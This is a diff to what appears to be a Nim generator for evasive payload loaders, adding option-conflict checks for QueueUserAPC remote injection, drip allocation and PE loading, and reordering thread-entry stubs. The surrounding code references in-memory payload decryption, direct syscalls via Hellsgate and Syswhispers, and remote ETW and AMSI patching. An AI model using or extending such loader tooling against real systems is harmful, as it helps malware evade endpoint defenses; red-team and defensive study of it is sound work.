@@ -659,6 +659,18 @@ if (wow64 and getfreshstub):
         echo "Only Syswhispers (without Jump) supports wow64 till now"
     quit(1)
 
+if (useQueueAPC and remoteinject and syswhispers):
+    echo "Error: QueueUserAPC not implemented for remote injection with Syswhispers yet. Only Hellsgate and GetSyscallStub."
+    quit(1)
+
+if (remoteMapSection and dripallocate):
+    echo "Error: Cannot use both --remoteMapSection and --dripallocate, not implemented yet"
+    quit(1)
+
+if (peload and dripallocate):
+    echo "Error: Cannot use both --peload and --dripallocate, not implemented yet"
+    quit(1)
+
 if (noArgs and embeddedArguments):
     echo "Error: Cannot use both --noArgs and --arguments"
     quit(1)
@@ -1575,12 +1587,13 @@ when defined(macPayload):
     proc RtlEthernetStringToAddressA*(str: PCSTR, terminator: ptr PCSTR, targetaddr: DWORD_PTR): NTSTATUS {.importc, dynlib: "ntdll.dll".}
 
 when defined(QueueAPC):
-    type
-      KNORMAL_ROUTINE* {.pure.} = object
-        NormalContext*: PVOID
-        SystemArgument1*: PVOID
-        SystemArgument2*: PVOID
-      PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
+    when not defined(Hellsgate):
+        type
+            KNORMAL_ROUTINE* {.pure.} = object
+                NormalContext*: PVOID
+                SystemArgument1*: PVOID
+                SystemArgument2*: PVOID
+            PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
 
 
 # Check, if OS is Windows Server 2012, as that is different with ntdll.dll on disk and memory
@@ -1730,7 +1743,7 @@ let Cryptstub3 = fmt"""
             when defined(csharp):
                 echo obf("[!] Decrypting C# Assembly for execution...")
             else:
-                echo obf("[!] Decrypting Payload for execution in memory...")
+                echo obf("[!] Decrypting Payload for execution in memory...\r\n")
         discard calcHard()
         dctx.init(ptrKey)
         discard calcHard()
@@ -2345,7 +2358,7 @@ if (remoteETWpatch or remoteAMSIpatch or jmpEntry):
     #    if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
 
 if(jmpEntry):
-    stub.add(CustomThreadEntryStub)
+    stub.add(CustomThreadEntryStubFirst)
 
 if(dripallocate):
     stub.add(DripAllocateStubFirst)
@@ -2384,6 +2397,9 @@ stub.add(getRandStub())
 stub.add(Cryptstub3)
 stub.add(getRandStub())
 stub.add(getRandStub())
+
+if(jmpEntry):
+    stub.add(CustomThreadEntryStubSecond)
 
 if(dripallocate):
     stub.add(DripAllocateStubSecond)
